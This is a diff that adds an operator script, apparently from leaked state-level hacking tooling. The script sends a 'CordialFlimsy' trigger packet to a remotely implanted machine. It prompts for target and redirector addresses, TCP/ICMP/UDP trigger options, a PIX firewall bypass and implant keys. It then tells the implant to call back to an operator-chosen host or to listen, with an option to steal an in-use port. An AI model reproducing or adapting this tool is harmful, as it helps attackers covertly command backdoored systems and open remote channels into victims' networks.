@@ -1,0 +1,895 @@
+
+@include "_Arrays.dsi";
+@include "_LpHelperFunctions.dsi";
+@include "_Paths.dsi";
+@include "_Versions.dsi";
+@include "_SendCFTrigger.dsi";
+
+if ($argc != 1)
+{
+    echo "Usage: $argv[0]";
+    echo "    Sends a CordialFlimsy trigger";
+	return false;
+}
+			 
+string %params;
+while (true)
+{
+	# get the target address
+	GetUserValue("Enter the TARGET ip address", %params, "dstAddr", "IP");
+	
+	# get the final destination address
+	#	(default to dstAddr)
+	if (!defined(%params{'finalDstAddr'}))
+	{
+		%params{'finalDstAddr'} = %params{'dstAddr'};
+	}
+	GetUserValue("Enter the FINAL DESTINATION ip address", %params, "finalDstAddr", "IP");
+	
+	# get the local IP
+	GetUserValue("Enter the LOCAL ip address", %params, "localAddr", "LOCALIP");
+	
+	# get the source IP 
+	#	(default to the chosen local IP)
+	if (!defined(%params{'srcAddr'}))
+	{
+		%params{'srcAddr'} = %params{'localAddr'};
+	}
+	GetUserValue("Enter the SOURCE ip address", %params, "srcAddr", "IP");
+	
+	if (prompt("Will this operation be REDIRECTED?", defined(%params{'redirectAddr'})))
+	{
+		# get the redirect address
+		#	(default to loopback)
+		if (!defined(%params{'redirectAddr'}))
+		{
+			%params{'redirectAddr'} = "127.0.0.1";
+		}
+		GetUserValue("Enter the REDIRECT ip address", %params, "redirectAddr", "IP");
+		GetUserValue("Enter the REDIRECT PORT", %params, "redirectPort", "PORT");
+	}
+	else
+	{
+		UndefKey(%params, "redirectAddr");
+		UndefKey(%params, "redirectPort");
+	}
+
+	#  ur compatible trigger
+	if (prompt("Will this be a UnitedRake Trigger?", defined(%params{'urCompatible'})))
+	{
+		%params{'urCompatible'} = "true";
+	}
+	else
+	{
+		UndefKey(%params, "urCompatible");
+	}
+	
+	# determine the trigger action type
+	ChooseAction(%params);
+	
+	# determine the trigger protocol
+	ChooseProtocol(%params);
+	
+	ChooseFirewall(%params);
+			
+	if (defined(%params{'urCompatible'}))
+	{
+		%params{'id'} = "0";
+		
+		# get the public key
+		GetUserValue("Enter the PUBLIC KEY location", %params, "key", "KEY");
+	}
+	else
+	{
+		# get the target id
+		GetUserValue("Enter the target's PC ID", %params, "id", "INT");	
+
+		# get timestamp
+		if ((<int>%params{'id'} == 0) || prompt("TIMESTAMP the trigger packet?"))
+		{
+			GetUserValue("Enter the trigger TIMESTAMP", %params, "timestamp", "TIMESTAMP");
+		}
+
+		# get the private key
+		GetUserValue("Enter the PRIVATE KEY location", %params, "key", "KEY");
+	}
+	
+
+	# print the information
+	echo "--------------------------------------------------------------------";
+	echo "Network Parameters:";
+	echo "    Target IP           : %params{'dstAddr'}";
+	echo "    Final Dest IP       : %params{'finalDstAddr'}";
+	echo "    Source IP           : %params{'srcAddr'}";
+	if (defined(%params{'redirectAddr'}))
+	{
+		echo "    Using Redirection   : YES";
+		echo "    Redirector IP       : %params{'redirectAddr'}";
+		echo "    Redirector Port     : %params{'redirectPort'}";
+	}
+	else
+	{
+		echo "    Using Redirection   : NO";
+		echo "    Redirector IP       : ";
+		echo "    Redirector Port     : ";
+	}
+
+	echo "";
+	echo "Trigger Parameters:";
+	echo "    Protocol            : %params{'protocol'}";
+	if (%params{'protocol'} == "ICMP")
+	{
+		echo "    ICMP type           : %params{'icmpType'}";
+		echo "    ICMP code           : %params{'icmpCode'}";
+	}
+	else
+	{
+		echo "    Source port         : %params{'protoSrcPort'}";
+		echo "    Destination port    : %params{'protoDstPort'}";
+		
+		if (%params{'protocol'} == "TCP")
+		{
+			if (defined(%params{'fullConnect'}))
+			{
+				echo "    Full TCP Connection : YES";
+				echo "    TCP flags           : ";
+			}
+			else
+			{
+				echo "    Full TCP connection : NO";
+				echo "    TCP flags           : %params{'tcpFlags'}";
+			}
+		}
+	}
+	
+	if (defined(%params{'format'}) && %params{'format'} != "NONE")
+	{
+		echo "    Format              : %params{'format'}";
+		if (%params{'format'} == "HTTP")
+		{
+			echo "    HTTP Action         : %params{'httpType'}";
+			echo "    User-Agent          : %params{'httpAgent'}";
+			echo "    Domain              : %params{'httpDomain'}";
+			echo "    Webpage             : %params{'httpPage'}";
+		}
+		else
+		{
+			if (defined(%params{'sendTo'}))
+			{
+				echo "    Send-To Address     : %params{'sendTo'}";
+				echo "    Send-From Address   : %params{'sendFrom'}";
+			}
+		}
+	}
+	
+	if (defined(%params{'firewall'}) && (%params{'firewall'} != "NONE"))
+	{
+		echo "    Firewall Bypass     : %params{'firewall'}";
+	}
+	else
+	{
+		echo "    Firewall Bypass     : ";
+	}
+	
+	echo "";
+	echo "Implant Parameters:";
+	echo "    Action              : %params{'action'}";
+	if (%params{'action'} == "CALLBACK")
+	{
+		echo "    Callback IP         : %params{'actionAddr'}";
+		echo "    Callback Src Port   : %params{'actionSrcPort'}";
+		echo "    Callback Dst Port   : %params{'actionDstPort'}";
+	}
+	else
+	{
+		echo "    Listen bind IP      : %params{'actionAddr'}";
+		echo "    Listen Port         : %params{'actionSrcPort'}";
+		echo "    Listen Time         : %params{'actionTime'}";
+	}
+	echo "    Target ID           : %params{'id'}";
+	if (defined(%params{'timestamp'}))
+	{
+		echo "    Timestamp           : %params{'timestamp'}";
+	}
+	echo "    Key                 : %params{'key'}";
+	if (defined(%params{'urCompatible'}))
+	{
+		echo "    UR Compatible		  : %params{'urCompatible'}";
+	}
+	
+	if (!prompt("Continue with the current values?"))
+	{
+		# go back to start
+		continue;
+	}
+
+	# send the trigger
+	SendTrigger(%params);
+
+	if (!prompt("Send another trigger?"))
+	{
+		break;
+	}
+}
+
+return true;
+
+#-------------------------------------------------------------------------------
+sub ChooseAction(REF string %params)
+{
+	if (defined(%params{'urCompatible'}))
+	{
+		%params{'action'} = "CALLBACK";
+	}
+	else
+	{
+		# determine the trigger action type
+		string $choices;
+		_AppendString($choices, "CALLBACK");
+		_AppendString($choices, "LISTEN");
+		GetUserChoice("Choose the callback ACTION", $choices, %params, "action");
+	}
+	if (%params{'action'} == "CALLBACK")
+	{
+		# callback
+		
+		# get the callback IP
+		#	(default to local IP)
+		if (!defined(%params{'actionAddr'}))
+		{
+			%params{'actionAddr'} = %params{'localAddr'};
+		}
+		GetUserValue("Enter the CALLBACK IP address", %params, "actionAddr", "IP");
+		
+		# get the callback src port
+		#	(default to 0)
+		if (!defined(%params{'actionSrcPort'}))
+		{
+			%params{'actionSrcPort'} = "0";
+		}
+
+		if (!defined(%params{'urCompatible'}))
+		{
+			GetUserValue("Enter the CALLBACK SOURCE PORT", %params, "actionSrcPort", "PORT");
+		}
+				
+		# get the callback dst port
+		#	(default to 0)
+		if (!defined(%params{'actionDstPort'}))
+		{
+			%params{'actionDstPort'} = "0";
+		}
+		GetUserValue("Enter the CALLBACK DESTINATION PORT", %params, "actionDstPort", "PORT");
+		
+		if (!defined(%params{'urCompatible'}))
+		{
+			if (prompt("Set proxy information?", defined(%params{'proxyAddr'})))
+			{
+				GetUserValue("Enter the proxy address", %params, "proxyAddr", "IP");
+				GetUserValue("Enter the proxy port", %params, "proxyPort", "PORT");
+				if (prompt("Set proxy user/pass?", defined(%params{'proxyUser'})))
+				{
+					GetUserValue("Enter the proxy username", %params, "proxyUser", "STRING");
+					GetUserValue("Enter the proxy password", %params, "proxyPass", "STRING");
+				}
+				else
+				{
+					if (defined(%params{'proxyUser'}))
+					{
+						undef(%params{'proxyUser'});
+					}
+					if (defined(%params{'proxyPass'}))
+					{
+						undef(%params{'proxyPass'});
+					}
+				}
+			}
+			else
+			{
+				if (defined(%params{'proxyAddr'}))
+				{
+					undef(%params{'proxyAddr'});
+				}
+				if (defined(%params{'proxyPort'}))
+				{
+					undef(%params{'proxyPort'});
+				}
+				if (defined(%params{'proxyUser'}))
+				{
+					undef(%params{'proxyUser'});
+				}
+				if (defined(%params{'proxyPass'}))
+				{
+					undef(%params{'proxyPass'});
+				}
+			}
+		}
+	}
+	else
+	{
+		# listen
+		
+		# get the listen bind IP
+		#	(default to 0.0.0.0)
+		if (!defined(%params{'actionAddr'}))
+		{
+			%params{'actionAddr'} = "0.0.0.0";
+		}
+		GetUserValue("Enter the LISTEN BIND address", %params, "actionAddr", "IP");
+		
+		# get the listen port
+		#	(default to 0)
+		if (!defined(%params{'actionSrcPort'}))
+		{
+			%params{'actionSrcPort'} = "1934";
+		}
+		GetUserValue("Enter the LISTEN PORT", %params, "actionSrcPort", "PORT");
+		
+		# get the listen time
+		#	(default to 300)
+		if (!defined(%params{'actionTime'}))
+		{
+			%params{'actionTime'} = "300";
+		}
+		GetUserValue("Enter the LISTEN TIME (in seconds)", %params, "actionTime", "INT");
+		
+		if (prompt("Are you stealing an in-use port?", defined(%params{'reuseAddr'})))
+		{
+			GetUserValue("Enter the traffic source address", %params, "reuseAddr", "IP");
+			GetUserValue("Enter the traffic source port", %params, "reusePort", "PORT");
+		}
+		else
+		{
+			if (defined(%params{'reuseAddr'}))
+			{
+				undef(%params{'reuseAddr'});
+			}
+			if (defined(%params{'reusePort'}))
+			{
+				undef(%params{'reusePort'});
+			}
+		}
+	}
+	
+	return true;
+	
+}	/* END ChooseAction */
+
+#-------------------------------------------------------------------------------
+sub ChooseFirewall(REF string %params)
+{
+
+	string $choices;
+	_AppendString($choices, "NONE");
+	_AppendString($choices, "PIX");
+	GetUserChoice("Choose the trigger FORMAT", $choices, %params, "firewall");
+	
+	return true;
+	
+}	/* END ChooseFirewall */
+
+#-------------------------------------------------------------------------------
+sub ChooseFormat(REF string %params, IN string $choices)
+{
+
+	GetUserChoice("Choose the trigger FORMAT", $choices, %params, "format");
+	if (%params{'format'} == "HTTP")
+	{
+		# HTTP
+		
+		# Get the request type
+		string $type;
+		_AppendString($type, "POST");
+		_AppendString($type, "GET");
+		GetUserChoice("Choose the HTTP TYPE", $type, %params, "httpType");
+	
+		# get the user-agent
+		if (!defined(%params{'httpAgent'}))
+		{
+			%params{'httpAgent'} = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)";
+		}
+		GetUserValue("Enter the HTTP USER-AGENT", %params, "httpAgent", "STRING");
+		
+		# get the domain
+		string $domain;
+		GetUserString("Enter the HTTP DOMAIN", %params, "httpDomain", $domain);
+		%params{'httpDomain'} = $domain;
+		
+		# get the webpage
+		#	(default to "/")
+		if (!defined(%params{'httpPage'}))
+		{
+			%params{'httpPage'} = "/";
+		}
+		string $page;
+		GetUserString("Enter the HTTP WEBPAGE PATH", %params, "httpPage", $page);
+
+		# see if we need to fix up the page
+		if (RegExMatch("^[^/].*\$", $page) && RegExMatch("^.*[^/]\$", $domain))
+		{
+			$page = "/$page";
+		}
+		%params{'httpPage'} = $page;
+	}
+	else
+	{
+		# something other than HTTP
+			
+		# send-addresses
+		if (prompt("Set SEND-TO and SEND-FROM addresses?", defined(%params{'sendTo'})))
+		{
+			GetUserValue("Enter the SEND-TO ADDRESS", %params, "sendTo", "STRING");
+			GetUserValue("Enter the SEND-FROM ADDRESS", %params, "sendFrom", "STRING");
+		}
+	}
+	
+	return true;
+	
+}	/* END ChooseFormat */
+			
+#-------------------------------------------------------------------------------
+sub ChooseProtocol(REF string %params)
+{
+
+	# determine the trigger action type
+	string $choices;
+	_AppendString($choices, "TCP");
+	_AppendString($choices, "ICMP");
+	_AppendString($choices, "UDP");
+	GetUserChoice("Choose the trigger PROTOCOL type", $choices, %params, "protocol");
+	
+	if (%params{'protocol'} == "TCP")
+	{
+		# TCP
+		
+		string $formatChoices;
+		_AppendString($formatChoices, "NONE");
+		_AppendString($formatChoices, "HTTP");
+		
+		# get the source port
+		#	(default to 0)
+		if (!defined(%params{'protoSrcPort'}))
+		{
+			%params{'protoSrcPort'} = "0";
+		}
+		GetUserValue("Enter the TCP SOURCE PORT", %params, "protoSrcPort", "PORT");
+		
+		# get the destination port
+		#	(default to 0)
+		if (!defined(%params{'protoDstPort'}))
+		{
+			%params{'protoDstPort'} = "80";
+		}
+		GetUserValue("Enter the TCP DESTINATION PORT", %params, "protoDstPort", "PORT");
+			
+		# tcp connect
+		if (prompt("Perform a full TCP connection?", defined(%params{'fullConnect'})))
+		{
+			# doing a full connection
+			%params{'fullConnect'} = "true";
+			
+			_AppendString($formatChoices, "SENDMAIL");
+		}
+		else
+		{
+			# not doing a full connection
+			UndefKey(%params, "fullConnect");
+			
+			# set tcp flags
+			#	(default to ack)
+			if (!defined(%params{'tcpFlags'}))
+			{
+				%params{'tcpFlags'} = "ack";
+			}
+			while (true)
+			{
+				echo "Valid Flags:";
+				echo "    syn fin rst push ack urg";
+				
+				string $flags;
+				if (!GetUserString("Enter comma seperated TCP FLAGS", %params, "tcpFlags", $flags))
+				{
+					return false;
+				}
+				if (RegExMatch("^((syn|fin|rst|push|ack|urg),)*(syn|fin|rst|push|ack|urg){1}\$", $flags))
+				{
+					%params{'tcpFlags'} = $flags;
+					break;
+				}
+				else
+				{
+					echo("Invalid tcp flags", ERROR);
+				}
+			}
+		}
+		
+		# choose a format
+		ChooseFormat(%params, $formatChoices);
+	}
+	else if (%params{'protocol'} == "ICMP")
+	{
+		# ICMP
+		
+		# get the ICMP type
+		#	(default to 8)
+		if (!defined(%params{'icmpType'}))
+		{
+			%params{'icmpType'} = "8";
+		}
+		GetUserValue("Enter the ICMP TYPE", %params, "icmpType", "INT");
+		
+		# get the ICMP code
+		#	(default to 0)
+		if (!defined(%params{'icmpCode'}))
+		{
+			%params{'icmpCode'} = "0";
+		}
+		GetUserValue("Enter the ICMP CODE", %params, "icmpCode", "INT");
+	}
+	else
+	{
+		# UDP
+		
+		# get the source port
+		#	(default to 0)
+		if (!defined(%params{'protoSrcPort'}))
+		{
+			%params{'protoSrcPort'} = "0";
+		}
+		GetUserValue("Enter the UDP SOURCE PORT", %params, "protoSrcPort", "PORT");
+		
+		# get the destination port
+		#	(default to 0)
+		if (!defined(%params{'protoDstPort'}))
+		{
+			%params{'protoDstPort'} = "53";
+		}
+		GetUserValue("Enter the UDP DESTINATION PORT", %params, "protoDstPort", "PORT");
+		
+	}
+	
+	return true;
+	
+}	/* END ChooseProtocol */
+
+#-------------------------------------------------------------------------------
+sub GetCurrentTimestamp(OUT string $timestamp)
+{
+	
+	string $temp;
+	if (GetTimestamp($temp))
+	{
+		string $values;
+		if (RegExMatch("^([0-9]{4})_([0-9]{2})_([0-9]{2})_([0-9]{2})h([0-9]{2})m([0-9]{2})s\$", $temp, $values))
+		{
+			if (sizeof($values) == 6)
+			{
+				$timestamp = "$values[0]-$values[1]-$values[2] $values[3]:$values[4]:$values[5]";
+				return true;
+			}
+		}
+	}
+	
+	return false;
+	
+}	/* END GetCurrentTimestamp */
+
+#-------------------------------------------------------------------------------
+sub GetUserChoice(IN string $comment, IN string $choices, REF string %params, IN string $key)
+{
+
+	int $numChoices = sizeof($choices);
+	
+	string $defaultValue="0";
+	if (defined(%params{$key}))
+	{
+		# user has made a choice -- look for it
+		for (int $i=0; $i < $numChoices; $i++)
+		{
+			if ($choices[$i] == %params{$key})
+			{
+				$defaultValue = "$i";
+				break;
+			}
+		}
+	}
+	
+	echo "Choices :";
+	for (int $i=0; $i < $numChoices; $i++)
+	{
+		echo "    $i - $choices[$i]";
+	}
+	
+	while (true)
+	{
+		int $value;
+		if (!GetUserInt($comment, $defaultValue, $value))
+		{
+			return false;
+		}
+		
+		if (($value >= 0) && ($value < $numChoices))
+		{
+			%params{$key} = $choices[$value];
+			return true;
+		}
+		else
+		{
+			int $maxIndex = $numChoices;
+			$maxIndex--;
+			echo "Value must be between 0 and $maxIndex";
+		}
+	}
+
+	# shouldn't get here
+	return false;
+	
+}	/* END GetUserChoice */
+	
+#-------------------------------------------------------------------------------
+sub GetUserInt(IN string $comment, IN string $defaultValue, OUT int $value)
+{
+	
+	if (defined($defaultValue))
+	{
+		while (!GetInput($comment, $value, $defaultValue))
+		{
+			# just loop
+		}
+	}
+	else
+	{
+		while (!GetInput($comment, $value))
+		{
+			# just loop
+		}
+	}
+	
+	return true;
+	
+}	/* END GetUserInt */
+
+#-------------------------------------------------------------------------------
+sub GetUserString(IN string $comment, IN string %params, IN string $key, OUT string $value)
+{
+	
+	if (defined(%params{'$key'}))
+	{
+		while (!GetInput($comment, $value, %params{'$key'}))
+		{
+			# just loop
+		}
+	}
+	else
+	{
+		while (!GetInput($comment, $value))
+		{
+			# just loop
+		}
+	}
+	
+	return true;
+	
+}	/* END GetUserString */
+
+#-------------------------------------------------------------------------------
+sub GetUserValue(IN string $comment, REF string %params, IN string $key, IN string $type)
+{
+	
+	bool $gotValue=false;
+	while (!$gotValue)
+	{
+		if ($type == "LOCALIP")
+		{
+			PrintLocalAddrs(%params, $key);
+		}
+		else if ($type == "TIMESTAMP")
+		{
+			if (!defined(%params{$key}))
+			{
+				GetCurrentTimestamp(%params{$key});
+			}
+		}
+		else if ($type == "KEY")
+		{
+			PrintKeys(%params, $key);
+		}
+		
+		# get the value
+		string $value;
+		if (!GetUserString($comment, %params, $key, $value))
+		{
+			return false;
+		}
+	
+		# check the value against the type
+		if ($type == "IP" || $type == "LOCALIP")
+		{
+			if (RegExMatch("^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\$", $value))
+			{
+				# good ip
+				$gotValue = true;
+				%params{$key} = $value;
+			}
+			else
+			{
+				echo("The value must be of the form ###.###.###.###", ERROR);
+			}
+		}
+		else if ($type == "PORT")
+		{
+			if (RegExmatch("^[0-9]+\$", $value) &&
+				(<int>$value >= 0) && (<int>$value <= 65535))
+			{
+				# good port
+				$gotValue = true;
+				%params{$key} = $value;
+			}
+			else
+			{
+				echo("The value must be a value port value (0 - 65535)", ERROR);
+			}
+		}
+		else if ($type == "INT")
+		{
+			if (RegExmatch("^(0x){0,1}[0-9]+\$", $value))
+			{
+				# good value
+				$gotValue = true;
+				%params{$key} = $value;
+			}
+			else
+			{
+				echo("The value must be a number", ERROR);
+			}
+		}
+		else if ($type == "TIMESTAMP")
+		{
+			if (RegExmatch("^[0-9]{4}-[0-9]{1,2}-[0-9]{1,2} [0-9]{1,2}:[0-9]{1,2}:[0-9]{1,2}\$", $value))
+			{
+				# good value
+				$gotValue = true;
+				%params{$key} = $value;
+			}
+			else
+			{
+				echo("The value must be a timestamp (YYYY-MM-DD hh:mm:ss)", ERROR);
+			}
+		}
+		else if ($type == "KEY")
+		{
+			string $lines;
+			if (ReadFile($value, $lines))
+			{
+				# good value
+				$gotValue = true;
+				%params{$key} = $value;
+			}
+			else
+			{
+				echo("Unable to open keyfile", ERROR);
+			}
+		}
+		else if ($type == "STRING")
+		{
+			# no error checking
+			$gotValue = true;
+			%params{$key} = $value;
+		}
+		else
+		{
+			echo("Unknown type ($type) -- no error checking", ERROR);
+			$gotValue = true;
+			%params{$key} = $value;
+		}
+	}
+	
+	return true;
+	
+}	/* END GetUserValue */
+
+#-------------------------------------------------------------------------------
+sub PrintKeys(REF string %params, IN string $key)
+{
+
+	string $resDir;
+	if (!_GetLpResourcesDirectory($resDir))
+	{
+		return false;
+	}
+	
+	string $files;
+	string $pc16Files;
+	if (!defined(%params{'urCompatible'}) && FileGetFiles("$resDir/Pc/Keys/", "private_key.bin", $files, true))
+	{
+		echo "Possible PC 2.x keys:";
+		for (int $i=0; $i < sizeof($files); $i++)
+		{
+			string $fullDir = $files[$i];
+			_NormalizePath($fullDir);
+			echo "    $fullDir";
+			
+			if (!defined(%params{$key}) && RegExMatch("Default", $fullDir))
+			{
+				%params{$key} = $fullDir;
+			}
+		}
+	}
+	if (defined(%params{'urCompatible'}) && FileGetFiles("$resDir/Ur/Keys/", "*URPublicKey.bin", $files, true))
+	{
+		echo "Possible UR 4.x keys:";
+		for (int $i=0; $i < sizeof($files); $i++)
+		{
+			string $fullDir = $files[$i];
+			_NormalizePath($fullDir);
+			echo "    $fullDir";
+			
+			if (!defined(%params{$key}))
+			{
+				%params{$key} = $fullDir;
+			}
+		}
+	}	
+		
+	return true;
+	
+}	/* END PrintKeys */
+
+#-------------------------------------------------------------------------------
+sub PrintLocalAddrs(REF string %params, IN string $key)
+{
+
+	string $envValue, $localAddrs;
+	if (GetEnv("_LOCAL_ADDRESSES", $envValue))
+	{
+		RegExSplit(";", $envValue, 0, $localAddrs);
+	}
+	else
+	{
+		# local addrs not found -- use ifconfig to get them
+		@record on;
+		@echo off;
+		if (`local ifconfig`)
+		{
+			GetCmdData("InterfaceItem::ipaddress::ip", $localAddrs);
+		}
+		@echo on;
+		@record off;
+		
+		# store the IPs for later user
+		$envValue = "";
+		for (int $i=0; $i < sizeof($localAddrs); $i++)
+		{
+			if (StrLen($envValue) > 0)
+			{
+				StrCat($envValue, ";");
+			}
+			StrCat($envValue, $localAddrs[$i]);
+		}
+		
+		if (StrLen($envValue) > 0)
+		{
+			SetEnv("_LOCAL_ADDRESSES", $envValue);
+		}
+	}
+
+	echo "LOCAL IP ADDRESSES:";
+	for (int $i=0; $i < sizeof($localAddrs); $i++)
+	{
+		# if no local ip has been set yet, default to the first one found
+		if (($i == 0) && !defined(%params{$key}))
+		{
+			%params{$key} = $localAddrs[$i];
+		}
+		if ($localAddrs[$i] != "127.0.0.1" && $localAddrs[$i] != "::1")
+		{
+			echo "    $localAddrs[$i]";
+		}
+	}
+	
+	return true;
+	
+}	/* END PrintLocalAddrs */
+
+
+
